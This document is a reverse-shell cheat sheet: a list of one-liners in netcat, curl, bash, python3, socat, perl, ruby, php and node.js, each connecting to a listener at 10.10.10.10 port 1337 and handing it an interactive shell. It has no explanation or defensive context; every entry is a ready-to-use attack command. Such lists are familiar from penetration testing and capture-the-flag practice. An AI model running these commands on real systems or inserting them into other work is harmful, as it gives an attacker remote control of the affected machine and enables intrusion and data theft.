                           		 		  	    					      			𝗥𝗲𝘃𝗲𝗿𝘀𝗲 𝗦𝗵𝗲𝗹𝗹𝘀
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗻𝗲𝘁𝗰𝗮𝘁 - 𝗺𝗸𝗳𝗶𝗳𝗼 ]

rm /tmp/x; mkfifo /tmp/x; cat /tmp/x | /bin/sh -i 2>&1 | nc 10.10.10.10 1337 > /tmp/x
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗰𝗨𝗥𝗟 𝘀𝗵𝗲𝗹𝗹 ]

{ curl -sNkT . http://10.10.10.10:1337 </dev/fd/3| sh 3>&-;} 3>&1|:

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗯𝗮𝘀𝗵 ]

/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗽𝘆𝘁𝗵𝗼𝗻𝟯 ]

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝘀𝗼𝗰𝗮𝘁 ]

socat TCP:10.10.10.10:1337 EXEC:'sh',pty,stderr,setsid,sigint,sane

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗽𝗲𝗿𝗹 ]

perl -e 'use Socket;$i="10.10.10.10";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗿𝘂𝗯𝘆 ]

ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.10.10",1337))'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗽𝗵𝗽 ]

php -r '$sock=fsockopen("10.10.10.10",1337);exec("sh <&3 >&3 2>&3");'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗻𝗼𝗱𝗲.𝗷𝘀 ]

require('child_process').exec('nc -e sh 10.10.10.10 1337')

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
